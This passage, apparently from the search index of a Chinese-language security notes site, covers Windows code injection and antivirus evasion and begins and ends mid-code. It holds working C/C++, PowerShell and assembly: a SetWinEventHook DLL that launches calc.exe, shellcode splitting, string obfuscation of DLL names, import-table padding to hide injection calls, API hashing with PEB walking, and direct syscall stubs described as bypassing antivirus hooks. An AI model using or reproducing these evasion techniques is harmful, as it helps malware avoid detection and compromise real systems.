printf(\"Failed!\\n\"); return 1; } // // keep process alive // ::GetMessage(nullptr, nullptr, 0, 0); return 0; } #include \"pch.h\" #pragma comment(lib, \"oleacc\") const char* EventNameToString(DWORD event) { switch (event) { case EVENT_SYSTEM_SOUND: return \"Sound\"; case EVENT_SYSTEM_ALERT: return \"Alert\"; case EVENT_SYSTEM_FOREGROUND: return \"Foreground\"; case EVENT_SYSTEM_MENUSTART: return \"Menu Start\"; case EVENT_SYSTEM_MENUEND: return \"Menu End\"; case EVENT_SYSTEM_CAPTURESTART: return \"Capture Start\"; case EVENT_SYSTEM_CAPTUREEND: return \"Capture End\"; case EVENT_SYSTEM_MOVESIZESTART: return \"Move/Size Start\"; case EVENT_SYSTEM_MOVESIZEEND: return \"Move/Size End\"; case EVENT_SYSTEM_DIALOGSTART: return \"Dialog Start\"; case EVENT_SYSTEM_DIALOGEND: return \"Dialog End\"; case EVENT_SYSTEM_SWITCHSTART: return \"Switch Start\"; case EVENT_SYSTEM_SWITCHEND: return \"Switch End\"; case EVENT_SYSTEM_MINIMIZESTART: return \"Minimize Start\"; case EVENT_SYSTEM_MINIMIZEEND: return \"Minimize End\"; case EVENT_OBJECT_CREATE: return \"Object Create\"; case EVENT_OBJECT_DESTROY: return \"Object Destroy\"; case EVENT_OBJECT_SHOW: return \"Object Show\"; case EVENT_OBJECT_HIDE: return \"Object Hide\"; case EVENT_OBJECT_STATECHANGE: return \"State Changed\"; case EVENT_OBJECT_LOCATIONCHANGE: return \"Location Changed\"; case EVENT_OBJECT_NAMECHANGE: return \"Name Change\"; case EVENT_OBJECT_DESCRIPTIONCHANGE: return \"Desc Changed\"; case EVENT_OBJECT_VALUECHANGE: return \"Value Changed\"; case EVENT_OBJECT_PARENTCHANGE: return \"Parent Changed\"; } return \"\"; } HANDLE hConsole; BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, PVOID lpReserved) { switch (reason) { case DLL_PROCESS_DETACH: if (hConsole) // be nice ::CloseHandle(hConsole); break; case DLL_PROCESS_ATTACH: if (::AllocConsole()) { auto hConsole = ::CreateFile(L\"CONOUT$\", GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr); if (hConsole == INVALID_HANDLE_VALUE) return FALSE; ::SetStdHandle(STD_OUTPUT_HANDLE, hConsole); } break; } return TRUE; } extern \"C\" __declspec(dllexport) void CALLBACK OnEvent(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD idEventThread, DWORD time) { CComPtr<IAccessible> spAcc; CComVariant child; ::AccessibleObjectFromEvent(hwnd, idObject, idChild, &spAcc, &child); CComBSTR name; if (spAcc) spAcc->get_accName(CComVariant(idChild), &name); printf(\"Event: 0x%X (%s) HWND: 0x%p, ID: 0x%X Child: 0x%X TID: %u Time: %u Name: %ws\\n\", event, EventNameToString(event), hwnd, idObject, idChild, idEventThread, time, name.m_str); system(\"calc.exe\"); }","title":"\u4f7f\u7528SetWinEventHook\u6765\u6267\u884c\u56de\u8c03\u4ee3\u7801"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#shellcode_3","text":"https://osandamalith.com/shellcodes/","title":"\u5404\u79cdshellcode"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#_9","text":"","title":"\u9632\u5fa1\u89c4\u907f"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#_10","text":"","title":"\u8fc7\u52a8\u6001\u7684\u65b9\u5f0f"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#_11","text":"\u4f7f\u7528Spartacus\u6765\u68c0\u67e5exe\u53ef\u52ab\u6301\u7684dll\u5e76\u81ea\u52a8\u751f\u6210\u8f6c\u53d1\u6a21\u677f `.\\Spartacus-v1.2.0-x64.exe --procmon C:\\Users\\user\\Desktop\\Procmon64.exe --pml test.plm --csv ./output.csv --exports . --verbose`","title":"\u767d\u5229\u7528"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#_12","text":"\u67e5\u770b\u4ee3\u7801\u6ce8\u5165 \u8282","title":"\u65b0\u6ce8\u5165\u6280\u672f"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#syscall","text":"","title":"\u76f4\u63a5/\u95f4\u63a5syscall"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#api-hash","text":"","title":"API HASH"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#api","text":"","title":"\u4f7f\u7528\u539f\u751fAPI"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#_13","text":"","title":"\u8fc7\u9759\u6001\u7684\u65b9\u5f0f"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#_14","text":"\u75af\u72c2\u6dfb\u52a0\u7a7a\u51fd\u6570 void dummyFunction() { } dummyFunction();","title":"\u7a7a\u51fd\u6570"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#_15","text":"\u50cf\u4ec0\u4e48\u6570\u503c\u8fd0\u7b97\u4e4b\u7c7b\u7684 int a = 0; a = a + 1;","title":"\u65e0\u610f\u4e49\u8bed\u53e5"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#sleep","text":"Sleep\u51fd\u6570\u4f1a\u51fa\u73b0\u5728\u5bfc\u5165\u8868\u4e2d Sleep(1); //\u5ef6\u65f61\u6beb\u79d2","title":"Sleep\u5ef6\u65f6"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#_16","text":"int a = 0; void delay() { for (volatile int i = 0; i < 1000000; i++) { a = a + 2; } delay()","title":"\u7a7a\u5faa\u73af\uff0c\u4e5f\u662f\u5ef6\u65f6"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#_17","text":"\u4ee3\u7801\u6f14\u793a\u521b\u5efa\u4e86\u4e00\u4e2a\u6307\u5411CreateEventW\u51fd\u6570\u7684\u51fd\u6570\u6307\u9488\u7c7b\u578bCreateEventWPtr\uff0c\u901a\u8fc7\u8fd9\u4e2a\u7c7b\u578b\u65b0\u5efacreateEventW\u6765\u95f4\u63a5\u8c03\u7528CreateEventW #include <stdio.h> #include <windows.h> typedef HANDLE(WINAPI *CreateEventWPtr)( LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCWSTR lpName ); int main() { HMODULE hKernel32 = GetModuleHandle(\"kernel32.dll\"); if (hKernel32 == NULL) { printf(\"Failed to load kernel32.dll\\n\"); return 1; } CreateEventWPtr createEventW = (CreateEventWPtr)GetProcAddress(hKernel32, \"CreateEventW\"); if (createEventW == NULL) { printf(\"Failed to get address of CreateEventW\\n\"); return 1; } HANDLE hEvent = createEventW(NULL, TRUE, FALSE, L\"MyEvent\"); if (hEvent == NULL) { printf(\"Failed to create event\\n\"); return 1; } printf(\"Event created successfully\\n\"); return 0; }","title":"\u65b0\u5efa\u51fd\u6570\u6307\u9488\u95f4\u63a5\u8c03\u7528"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#_18","text":"\u591a\u6dfb\u52a0\u70b9\u51fd\u6570\uff0c\u8c03\u7528\u8fd9\u4e9b\u51fd\u6570\u4ea7\u751f\u65e0\u610f\u4e49\u7684\u7ed3\u679c\uff0c\u8ba9\u66f4\u591a\u6b63\u5e38\u51fd\u6570\u51fa\u73b0\u5728\u5bfc\u5165\u8868\u4e2d\u3002 \u4f7f\u7528\u54ea\u4e9b\u6b63\u5e38\u51fd\u6570\u53ef\u53c2\u7167\u6b63\u5e38\u7a0b\u5e8f\u3002 \u4e0d\u7136\u76f4\u63a5\u770b\u5230\u9664\u4e86OpenProcess\u3001VirtualAlloc\u3001memcpy\u3001processHandle\u8fd9\u79cd\u5c31\u6ca1\u6709\u5176\u4ed6\u7684\u51fd\u6570\u4e86\uff0c\u4e00\u773c\u5c31\u77e5\u9053\u662f\u9a6c lstrlenW\u51fd\u6570 LPCWSTR str = L\"Hello, World!\"; lstrlenW(str); \u5176\u4ed6....","title":"\u591a\u6dfb\u52a0\u51fd\u6570\u8c03\u7528,\u4ea7\u751f\u65e0\u610f\u4e49\u7ed3\u679c"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#shellcode_4","text":"\u628ashellcode\u5206\u6210\u4e24\u6bb5\uff0c\u518d\u7ec4\u5408 unsigned char shellcode[] = \"\\xfd\\x48\\x83\\xe4\\xf0\"; char first[] = \"\\xfc\"; memcpy(shellcode, first, 1); //\u628afirst\u76841\u4e2a\u5b57\u8282\u590d\u5236\u5230shellcdoe\u91cc\uff0c\u590d\u5236\u662f\u7531\u524d\u5f80\u540e\u590d\u5236\u7684\uff0c\u8fd9\u91cc\u7684\u590d\u5236\u662f\u8986\u76d6\uff0c\u8981\u590d\u5236\u591a\u5c11\u8fc7\u53bb\uff0c\u5c31\u8981\u5728\u539fshellcode\u9700\u8981\u586b\u5145\u591a\u5c11\u5b57\u8282\u7684\u6570\u636e","title":"shellcode\u5206\u79bb\u518d\u7ec4\u5408"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#_19","text":"\u52a0\u8f7ddll\u65f6\u4f7f\u7528\u6570\u7ec4\u53ef\u6253\u4e71\u9488\u5bf9dll\u540d\u79f0\u5173\u952e\u5b57\u7684\u9759\u6001\u67e5\u6740 \u5047\u5982 LoadLibraryA(\"NTDLL.DLL\") \u88ab\u6740\uff0c\u53ef\u4ee5\u91c7\u7528\u4ee5\u4e0b\u65b9\u5f0f\u89e3\u51b3 CHAR NameStr[] = {'A','D','V','A','P','I','3','2','.','D','L','L','\\0'}; LoadLibraryA(NameStr); \u8fd8\u53ef\u4ee5\u7528\u6570\u7ec4\u62c6\u5206\u65b9\u5f0f\u8fdb\u4e00\u6b65\u6253\u4e71\u5173\u952e\u5b57 CHAR NameStr[] = {'A','D','V','A','P','I','3','2','\\0'}; CHAR OtherStr[] = {'.','D','L','L','\\0'}; CHAR CombinedStr[sizeof(NameStr) + sizeof(OtherStr)]; strcpy(CombinedStr, NameStr); strcat(CombinedStr, OtherStr); LoadLibraryA(CombinedStr);","title":"\u5173\u952e\u5b57\u6570\u7ec4\u5316\u5904\u7406"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#_20","text":"\u4f7f\u7528\u6c47\u7f16\u4ee3\u7801\u5f3a\u5236\u66f4\u6539\u7a0b\u5e8f\u8fd0\u884c\u903b\u8f91 https://blog.malicious.group/inline-assembly/","title":"\u5185\u8054\u6c47\u7f16"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#_21","text":"Alcatraz \u4e8c\u8fdb\u5236\u6df7\u6dc6 https://github.com/weak1337/Alcatraz","title":"\u4ee3\u7801\u6df7\u6dc6"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#hook","text":"\u8fd9\u91cc\u9700\u8981\u660e\u767d\u4e00\u4e2a\u57fa\u672c\u9053\u7406\uff0c\u7cfb\u7edf\u7ea7\u522b\u7684\u51fd\u6570\u90fd\u662f\u5728 ntdll.dll \u4e2d\uff0c\u51fd\u6570\u8c03\u7528\u9700\u8981\u5728\u5185\u5b58\u4e2d\u627e\u5230\u51fd\u6570\u7684\u5730\u5740\uff0c\u7136\u540e\u624d\u53ef\u4ee5\u8c03\u7528\u3002","title":"\u7ed5\u6740\u8f6fhook"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#api-hash_1","text":"\u901a\u8fc7\u51fd\u6570\u540d\u79f0\u8ba1\u7b97\u4e00\u4e2ahash\u503c\uff0c\u8c03\u7528\u65f6\u53cd\u8ba1\u7b97hash\u503c\u5f97\u5230\u51fd\u6570\u540d\uff0c\u518d\u6839\u636e\u51fd\u6570\u540d\u5728\u5185\u5b58\u4e2d\u67e5\u627e\u51fd\u6570\u5730\u5740\uff0c\u65b0\u5efa\u4e00\u4e2a\u76f8\u540c\u7684\u51fd\u6570\u6307\u9488\u6765\u8c03\u7528\u539f\u51fd\u6570\u5730\u5740 ##\u7b2c\u4e00\u6b65\uff0c\u8ba1\u7b97\u8981\u9690\u85cf\u7684\u51fd\u6570hash,\u5176\u4e2d$hash\u548c0xab10f2ff\u53ef\u4ee5\u81ea\u5b9a\u4e49\uff0c\u4ee5CreateProcessA\u4e3a\u4f8b\uff0c\u8ba1\u7b97\u7684hash\u662f0x005882941 $APIsToHash = @(\"CreateProcessA\") $APIsToHash | % { $api = $_ $hash = 0x44 [int]$i = 0 $api.ToCharArray() | % { $l = $_ $c = [int64]$l $c = '0x{0:x}' -f $c $hash += $hash * 0xab10f2ff + $c -band 0xffffff $hashHex = '0x{0:x}' -f $hash $i++ write-host \"Iteration $i : $l : $c : $hashHex\" } write-host \"$api`t $('0x00{0:x}' -f $hash)\" } //\u7b2c\u4e8c\u6b65\uff0c\u7f16\u5199\u76f8\u5e94hash\u89e3\u5bc6\u51fd\u6570\u4e0e\u51fd\u6570\u5730\u5740\u67e5\u627e\u51fd\u6570 DWORD getHashFromString(char* string) { size_t stringLength = strnlen_s(string, 50); DWORD hash = 0x44; for (size_t i = 0; i < stringLength; i++) { hash += (hash * 0xab10f2ff + string[i]) & 0xffffff; } // printf(\"%s: 0x00%x\\n\", string, hash); return hash; } PDWORD getFunctionAddressByHash(char* library, DWORD hash) { PDWORD functionAddress = (PDWORD)0; // Get base address of the module in which our exported function of interest resides (kernel32 in the case of CreateThread) HMODULE libraryBase = LoadLibraryA(library); PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase; PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader->e_lfanew); DWORD_PTR exportDirectoryRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress; PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA); // Get RVAs to exported function related information PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfFunctions); PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNames); PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNameOrdinals); // Iterate through exported functions, calculate their hashes and check if any of them match our hash of 0x00544e304 (CreateThread) // If yes, get its virtual memory address (this is where CreateThread function resides in memory of our process) for (DWORD i = 0; i < imageExportDirectory->NumberOfFunctions; i++) { DWORD functionNameRVA = addressOfNamesRVA[i]; DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA; char* functionName = (char*)functionNameVA; DWORD_PTR functionAddressRVA = 0; // Calculate hash for this exported function DWORD functionNameHash = getHashFromString(functionName); // If hash for CreateThread is found, resolve the function address if (functionNameHash == hash) { functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]]; functionAddress = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA); printf(\"%s : 0x%x : %p\\n\", functionName, functionNameHash, functionAddress); return functionAddress; } } } //\u7b2c\u4e09\u6b65\uff0c\u65b0\u5efa\u4e00\u4e2a\u76f8\u5bf9\u5e94\u7684\u51fd\u6570\u6307\u9488 using NewCreateProcessA = BOOL(WINAPI*)( LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation ); //\u7b2c\u56db\u6b65\uff0c\u5728main\u51fd\u6570\u5f15\u7528\u8fd9\u4e2a\u65b0\u51fd\u6570 int main(){ PDWORD functionAddress = nullptr; //\u6307\u9488\u521d\u59cb\u5316 functionAddress = getFunctionAddressByHash((char*)\"kernel32\", 0x005882941); //\u5f97\u5230\u51fd\u6570\u5730\u5740 NewCreateProcessA CreateProcessB = (NewCreateProcessA)functionAddress; //\u65b0\u5efa\u4e00\u4e2a\u51fd\u6570\u7c7b\u578b //\u5f15\u7528CreateProcessB STARTUPINFOA si = {}; PROCESS_INFORMATION pi = {}; CreateProcessB(NULL, (LPSTR)\"C:\\\\Windows\\\\System32\\\\notepad.exe\", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi); } \u6253\u5f00\u4e86notepad\uff0c\u4f46\u5bfc\u5165\u8868\u4e2d\u6ca1\u6709CreateProcessA","title":"\u4f7f\u7528API-HASH"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#api-hash2getmodulehandlegetprocaddress","text":"\u5b9a\u4e49\u4e0d\u540c\u7684\u51fd\u6570\u9700\u8981\u5b9e\u73b0\u4e0d\u540c\u7684\u51fd\u6570\u539f\u578b \u5934\u6587\u4ef6\u5b9a\u4e49\u7c7b\u578b // typedefs.h #pragma once #include <Windows.h> typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, * PUNICODE_STRING; typedef struct _LDR_MODULE { LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList; PVOID BaseAddress; PVOID EntryPoint; ULONG SizeOfImage; UNICODE_STRING FullDllName; UNICODE_STRING BaseDllName; ULONG Flags; SHORT LoadCount; SHORT TlsIndex; LIST_ENTRY HashTableEntry; ULONG TimeDateStamp; } LDR_MODULE, * PLDR_MODULE; typedef struct _PEB_LDR_DATA { BYTE Reserved1[8]; PVOID Reserved2[3]; LIST_ENTRY InMemoryOrderModuleList; } PEB_LDR_DATA, * PPEB_LDR_DATA; typedef struct _RTL_USER_PROCESS_PARAMETERS { ULONG MaximumLength; ULONG Length; ULONG Flags; ULONG DebugFlags; PVOID ConsoleHandle; ULONG ConsoleFlags; HANDLE StdInputHandle; HANDLE StdOutputHandle; HANDLE StdErrorHandle; UNICODE_STRING CurrentDirectoryPath; HANDLE CurrentDirectoryHandle; UNICODE_STRING DllPath; UNICODE_STRING ImagePathName; UNICODE_STRING CommandLine; PVOID Environment; } RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS; typedef struct _PEB { BYTE Reserved1[2]; BYTE BeingDebugged; BYTE Reserved2[1]; PVOID Reserved3[2]; PPEB_LDR_DATA Ldr; PRTL_USER_PROCESS_PARAMETERS ProcessParameters; BYTE Reserved4[104]; PVOID Reserved5[52]; PVOID PostProcessInitRoutine; BYTE Reserved6[128]; PVOID Reserved7[1]; ULONG SessionId; } PEB, * PPEB; typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES; typedef OBJECT_ATTRIBUTES* POBJECT_ATTRIBUTES; #define InitializeObjectAttributes( p, n, a, r, s ) { \\ (p)->Length = sizeof( OBJECT_ATTRIBUTES ); \\ (p)->RootDirectory = r; \\ (p)->Attributes = a; \\ (p)->ObjectName = n; \\ (p)->SecurityDescriptor = s; \\ (p)->SecurityQualityOfService = NULL; \\ } typedef struct _CLIENT_ID { PVOID UniqueProcess; PVOID UniqueThread; } CLIENT_ID, * PCLIENT_ID; // NTAPI function types typedef NTSTATUS(NTAPI* typeNtOpenProcess)(_Out_ PHANDLE ProcessHandle, _In_ ACCESS_MASK DesiredAccess, _In_ POBJECT_ATTRIBUTES ObjectAttributes, _In_opt_ PCLIENT_ID ClientId); typedef NTSTATUS(NTAPI* typeNtAllocateVirtualMemory)(_In_ HANDLE ProcessHandle, _Inout_ PVOID* BaseAddress, _In_ ULONG_PTR ZeroBits, _Inout_ PSIZE_T RegionSize, _In_ ULONG AllocationType, _In_ ULONG Protect); typedef NTSTATUS(NTAPI* typeNtProtectVirtualMemory)(_In_ HANDLE ProcessHandle, _Inout_ PVOID* BaseAddress, _Inout_ PSIZE_T NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessPRotection); typedef NTSTATUS(NTAPI* typeNtWriteVirtualMemory)(_In_ HANDLE ProcessHandle, _In_ PVOID BaseAddress, _In_ PVOID Buffer, _In_ ULONG NumberOfBytesToWrite, _Out_ PULONG NumberOfBytesWritten OPTIONAL); typedef NTSTATUS(NTAPI* typeNtClose)(_In_ HANDLE Handle); \u4e3b\u6587\u4ef6 #include <windows.h> #include \"typedefs.h\" #include <stdio.h> #define HashStringA(x) HashStringFowlerNollVoVariant1aA(x) #define HashStringW(x) HashStringFowlerNollVoVariant1aW(x) #define HashStringNtdll 0x467f5122 #define HashNtCreateFile 0x20ef5396 //\u8fd9\u91cc\u53ef\u4ee5\u76f4\u63a5\u5b9a\u4e49\u4e5f\u53ef\u4ee5HashStringA\u6765\u8ba1\u7b97\uff0c\u8ba1\u7b97\u4f20\u5165\u7684\u5fc5\u987b\u662f\u5c0f\u5199 ULONG HashStringFowlerNollVoVariant1aA(_In_ LPCSTR String) { ULONG Hash = 0x6A6CCC06; while (*String) { Hash ^= (UCHAR)*String++; Hash *= 0x25EDE3FB; } return Hash; } ULONG HashStringFowlerNollVoVariant1aW(_In_ LPCWSTR String) { ULONG Hash = 0x6A6CCC06; while (*String) { Hash ^= (UCHAR)*String++; Hash *= 0x25EDE3FB; } return Hash; } HMODULE _GetModuleHandle(_In_ ULONG dllHash) { PLIST_ENTRY head = (PLIST_ENTRY) & ((PPEB)__readgsqword(0x60))->Ldr->InMemoryOrderModuleList; PLIST_ENTRY next = head->Flink; PLDR_MODULE module = (PLDR_MODULE)((PBYTE)next - 16); while (next != head) { module = (PLDR_MODULE)((PBYTE)next - 16); if (module->BaseDllName.Buffer != NULL) { if (dllHash - HashStringW(module->BaseDllName.Buffer) == 0) return (HMODULE)module->BaseAddress; } next = next->Flink; } return NULL; } FARPROC _GetProcAddress(_In_ HMODULE dllBase, _In_ ULONG funcHash) { PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)(dllBase); PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)dos + (dos)->e_lfanew); PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)dos + (nt)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); if (exports->AddressOfNames != 0) { PWORD ordinals = (PWORD)((UINT_PTR)dllBase + exports->AddressOfNameOrdinals); PDWORD names = (PDWORD)((UINT_PTR)dllBase + exports->AddressOfNames); PDWORD functions = (PDWORD)((UINT_PTR)dllBase + exports->AddressOfFunctions); for (DWORD i = 0; i < exports->NumberOfNames; i++) { LPCSTR name = (LPCSTR)((UINT_PTR)dllBase + names[i]); if (HashStringA(name) == funcHash) { PBYTE function = (PBYTE)((UINT_PTR)dllBase + functions[ordinals[i]]); return (FARPROC)function; } } } return NULL; } int main() { LPCSTR DLLNAME = \"ntdll.dll\"; LPCSTR funcname = \"NtCreateFile\"; ULONG A = HashStringA(DLLNAME); //HashString\u4f20\u5165\u7684\u53c2\u6570\u5fc5\u987b\u662f\u5c0f\u5199 ULONG B = HashStringA(funcname); printf(\"A 0x%x\\n\", A); printf(\"B 0x%x\", B); HMODULE dllBase1 = _GetModuleHandle(HashStringA(DLLNAME)); HMODULE dllBase2 = _GetModuleHandle(HashStringNtdll); //HMODULE dllBase3 = _GetModuleHandle(HashStringNtdll1); HMODULE dllBase4 = GetModuleHandleA(\"NTDLL.DLL\"); if (dllBase1 == NULL) { printf(\"Unable to locate base address of 0x%x\", dllBase1); } FARPROC addr = GetProcAddress(LoadLibraryA(\"ntdll\"), \"NtCreateFile\"); FARPROC addr1 = _GetProcAddress(dllBase1, HashNtCreateFile); //_GetProcAddress\u7b49\u540c\u4e8eGetProcAddress\uff1b_GetModuleHandle\u53ef\u4ee5\u5f53LoadLibraryA\u6765\u7528 return 0; }","title":"API-HASH2\uff08GetModuleHandle\u548cGetProcAddress\uff09"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#syscallnthook","text":"https://j00ru.vexillium.org/syscalls/nt/64/ \u8fd9\u4e2a\u65b9\u6cd5\u662f\u6a21\u62df\u4e86\u4e00\u4e2a\u539f\u51fd\u6570\u7684 syscall \u8fc7\u7a0b\u7136\u540e\u5bf9\u8fd9\u4e2a\u51fd\u6570\u8fdb\u884c\u4e86\u66f4\u540d\uff0c\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u53ef\u4ee5\u7ed5\u8fc7\u6740\u8f6f\u7684hook\u3002 \u53ef\u4ee5\u4f7f\u7528\u6c47\u7f16\u8bed\u8a00\u7f16\u5199\u76ee\u6807\u51fd\u6570\u7684syscall\u8fc7\u7a0b\uff0c\u6765\u5b9e\u73b0\u4e00\u4e2a\u529f\u80fd\u76f8\u540c\u4f46\u540d\u79f0\u4e0d\u540c\u7684\u907f\u514d\u88ab\u6740\u8f6fhook\u7684\u51fd\u6570\u7684\u65b9\u5f0f\u3002 \u672c\u60f3\u5b9e\u73b0\u521b\u5efa\u8fdb\u7a0b\uff0c\u7531\u4e8e NTCreateProcess \u6587\u6863\u6ca1\u6709\u516c\u5f00\uff0c\u6240\u4ee5\u6309\u7167\u6559\u7a0b\u6765\u5b9e\u73b0 NtCreateFile \u51fd\u6570\u3002 \u9996\u5148\u627e\u5230 NTCreateProcess \u7684\u7cfb\u7edf\u8c03\u7528\u8fc7\u7a0b\u7684\u6c47\u7f16\u4ee3\u7801 \u53ef\u4ee5\u8c03\u8bd5\u4e00\u4e2a\u8c03\u4e86NTDLL.dll\u7684\u7a0b\u5e8f\uff0c\u627e\u5230\u51fd\u6570\u7684\u8fc7\u7a0b 0:000> u NtCreateFile ntdll!NtCreateFile: 00007ffb`3770f7e0 4c8bd1 mov r10,rcx 00007ffb`3770f7e3 b855000000 mov eax,55h 00007ffb`3770f7e8 f604250803fe7f01 test byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1 00007ffb`3770f7f0 7503 jne ntdll!NtCreateFile+0x15 (00007ffb`3770f7f5) 00007ffb`3770f7f2 0f05 syscall 00007ffb`3770f7f4 c3 ret 00007ffb`3770f7f5 cd2e int 2Eh 00007ffb`3770f7f7 c3 ret \u7cbe\u7b80\u4e00\u4e0b\uff0c\u53ef\u4ee5\u79fb\u9664 test \u548c jne .code SysNtCreateFile proc mov r10, rcx mov eax, 55h syscall ret SysNtCreateFile endp end \u627e\u5230 NtCreateFile \u7ed3\u6784\u4f53\u5e76\u521b\u5efa\u4e00\u4e2a\u76f8\u540c\u7684 SysNtCreateFile \u7ed3\u6784\u4f53\uff0c\u521d\u59cb\u5316\u53d8\u91cf\uff0c\u4e4b\u540e\u5c31\u53ef\u6b63\u5e38\u8c03\u7528 SysNtCreateFile #include <Windows.h> #include \"winternl.h\" #pragma comment(lib, \"ntdll\") EXTERN_C NTSTATUS SysNtCreateFile( PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength); int main() { //FARPROC addr = GetProcAddress(LoadLibraryA(\"ntdll\"), \"NtCreateFile\"); OBJECT_ATTRIBUTES oa; HANDLE fileHandle = NULL; NTSTATUS status = NULL; UNICODE_STRING fileName; IO_STATUS_BLOCK osb; 